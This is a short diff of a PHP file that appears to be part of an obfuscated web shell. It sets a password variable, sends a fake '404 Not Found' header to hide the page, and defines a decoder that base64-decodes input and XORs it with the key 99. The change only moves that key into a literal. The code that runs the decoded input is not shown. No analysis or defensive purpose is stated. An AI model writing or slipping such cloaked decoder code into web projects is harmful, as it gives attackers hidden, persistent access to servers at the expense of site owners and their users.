@@ -1,13 +1,12 @@
 <?php
 $pass = "data";
-$k = 99;
 header("HTTP/1.1 404 Not Found");
 function decoder($s,$k){
 	$res = '';
 	$s = rtrim(base64_decode($s),'/');
 	$s = explode('/', $s);
 	foreach ($s as $key => $value) {
-		$res .= chr($value^$k);
+		$res .= chr($value^99);
 	}
 	return base64_decode($res);
 }
